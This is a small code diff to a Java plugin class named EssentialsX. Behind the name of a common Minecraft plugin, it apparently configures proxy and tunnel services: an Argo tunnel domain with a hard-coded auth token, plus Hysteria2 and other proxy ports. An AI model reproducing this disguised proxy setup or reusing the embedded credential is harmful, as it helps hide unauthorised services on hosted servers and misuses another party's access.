@@ -82,7 +82,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "dee.myusdt.eu.cc");
         env.put("ARGO_AUTH", "eyJhIjoiNTkwM2E3NjFiZWU3NDlhYTRjNDIwNTdhODJmYmViNzYiLCJ0IjoiZjcyYzY0YjUtZTZhMC00ZWQyLTk5MzktMDg4NGRkNGE0NDM0IiwicyI6IlpUbGlNRE5pWm1RdFlUZzVNaTAwTURWaUxUZzBOV1V0WldabU1qQTBaV1V5TWpNMyJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
+        env.put("HY2_PORT", "25512");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -93,7 +93,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
